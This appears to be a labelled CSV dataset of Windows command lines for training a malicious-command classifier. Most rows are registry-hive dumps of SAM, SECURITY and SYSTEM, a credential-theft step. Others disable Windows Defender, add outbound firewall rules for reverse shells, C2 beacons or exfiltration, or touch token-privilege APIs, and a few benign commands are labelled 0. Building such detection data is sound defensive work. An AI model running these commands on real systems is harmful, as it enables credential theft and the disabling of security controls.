text,label
"powershell -nop -c ""reg save hklm\sam c:\temp\781z4exw.dat""",1
reg export hklm\system c:\windows\temp\2k9nske7.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ahv5lcqu.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\mwfia14k.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\nepygf2h.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\l6wl9h5s.dat""""",1
reg save hklm\sam c:\windows\temp\fpq7scv3.save,1
reg export hklm\sam c:\windows\temp\px16hnhm.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\bhese0cw.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ha8bwxff.dat""",1
reg   export   hklm\sam   c:\windows\temp\b4kxyo50.save,1
reg export hklm\system c:\windows\temp\snb88ffc.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\s7m1s0dd.dat""",1
reg save hklm\sam c:\windows\temp\q7svp2zt.save,1
"powershell -nop -c ""sc stop windefend""",2
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\p3d0mx65.save""",1
"powershell -nop -c ""$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
"cmd.exe /c ""reg export hklm\security c:\temp\xm7au1iv.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\lrm7unvx.dat""",1
reg export hklm\security c:\windows\temp\9r1fle9u.save,1
reg   export   hklm\sam   c:\windows\temp\iezl19cd.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\5rvj75nh.dat""",1
reg export hklm\sam c:\windows\temp\cb63swn0.save,1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\security c:\windows\temp\nc5oms11.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\xhbv34ud.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\z57zlnbr.dat""",1
reg export hklm\system c:\windows\temp\v3i1tcfg.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\nzr3oz14.dat""",1
reg save hklm\security c:\windows\temp\xoegxqvr.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\huda2cir.dat""",1
"cmd.exe /c ""ipconfig   /all""",0
"cmd.exe /c ""reg export hklm\security c:\windows\temp\lg7ebest.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4k1i73d1.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\t3ec0gob.dat""",1
reg save hklm\sam c:\windows\temp\vcu4r9kw.save,1
reg save hklm\security c:\windows\temp\s1z1z7gy.save,1
reg export hklm\security c:\windows\temp\tzepo4fx.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\44ktj9i2.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\f6wk097d.dat""",1
rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
"powershell -nop -c ""reg export hklm\security c:\temp\15tfyue6.dat""",1
reg save hklm\security c:\windows\temp\4buvgipu.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\vkxw931k.dat""",1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\a4k66ty7.save""",1
reg export hklm\system c:\windows\temp\i39upho6.save,1
reg export hklm\system c:\windows\temp\16zrzsz4.save,1
reg save hklm\security c:\windows\temp\afz6rxlx.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\woq21p9w.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\4r7u90d8.dat""",1
"cmd.exe /c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\sam c:\windows\temp\kbei3jgb.save,1
reg  export  hklm\system  c:\windows\temp\v90vm7qb.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\jc05p066.dat""",1
"powershell -nop -c ""python   -m   http.server   8080""",0
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\ce4614f6.save""",1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\4gzqcwmw.save""",1
reg export hklm\sam c:\windows\temp\fx20c9lj.save,1
reg save hklm\security c:\windows\temp\l89y2cnu.save,1
"cmd.exe /c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg export hklm\security c:\temp\0elbwwue.dat""",1
reg export hklm\sam c:\windows\temp\di0dw6rx.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\6ucac56q.dat""",1
reg save hklm\security c:\windows\temp\8n19robh.save,1
reg  save  hklm\security  c:\windows\temp\e5446mol.save,1
reg export hklm\sam c:\windows\temp\e605e3h4.save,1
reg  export  hklm\system  c:\windows\temp\higw1izd.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\hchsb7c8.dat""",1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""reg export hklm\security c:\temp\t5glkfy9.dat""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\rtlntyah.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ct88kurx.dat""",1
reg export hklm\sam c:\windows\temp\h9otilst.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\w5uybq9v.dat""",1
reg save hklm\sam c:\windows\temp\29v9xhjd.save,1
reg save hklm\security c:\windows\temp\ve3jogb9.save,1
reg export hklm\sam c:\windows\temp\knwo7sev.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\lwtvbfeu.dat""",1
reg export hklm\system c:\windows\temp\wtyu0o9v.save,1
reg save hklm\security c:\windows\temp\80389049.save,1
reg save hklm\security c:\windows\temp\65sfmvbv.save,1
reg save hklm\system c:\windows\temp\vqugy63m.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3rpqcnh4.dat""",1
"cmd.exe /c ""get-help   adjusttokenprivileges   -full""",0
reg save hklm\sam c:\windows\temp\ziyotis4.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\oakgai6g.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\cox1snvo.dat""",1
reg save hklm\security c:\windows\temp\9kuzx25c.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\mzs05ffz.dat""",1
reg save hklm\sam c:\windows\temp\x9vutc4k.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\xnwsse6t.dat""",1
reg export hklm\sam c:\windows\temp\d8ez6xfl.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\kx6r5ec1.dat""",1
reg save hklm\system c:\windows\temp\n10k900f.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\v2szqb1a.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\lhajbyzz.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\4w83gh1o.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\r98trb4q.dat""",1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg export hklm\security c:\temp\6pi9pyor.dat""",1
set-mppreference   -disablerealtimemonitoring   $true,2
reg export hklm\sam c:\windows\temp\uk20jwac.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\ze8hi5qa.dat""""",1
reg save hklm\system c:\windows\temp\xoga04fy.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\z3qe32q2.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1k964c2o.dat""",1
reg export hklm\system c:\windows\temp\g23jwicg.save,1
reg export hklm\security c:\windows\temp\tmdc9lrt.save,1
"powershell -nop -c ""select-string   -path   c:\logs\app.log   -pattern   'failed   logon'""",0
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\saah4jf7.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xqghxe7m.dat""",1
reg save hklm\sam c:\windows\temp\nrlu7ev4.save,1
reg save hklm\sam c:\windows\temp\u2tiy5z7.save,1
reg export hklm\system c:\windows\temp\z9dhkz2f.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\omx056ir.dat""""",1
reg export hklm\system c:\windows\temp\zqpzj2rj.save,1
reg export hklm\security c:\windows\temp\2phecrrr.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\agy6ryan.dat""",1
reg  save  hklm\system  c:\windows\temp\49lvhjfx.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\1tjuvu8q.dat""",1
rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg export hklm\sam c:\windows\temp\kzn25t0x.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
reg save hklm\security c:\windows\temp\blq1p9sj.save,1
reg export hklm\system c:\windows\temp\yccz00tj.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\tljvgatu.dat""",1
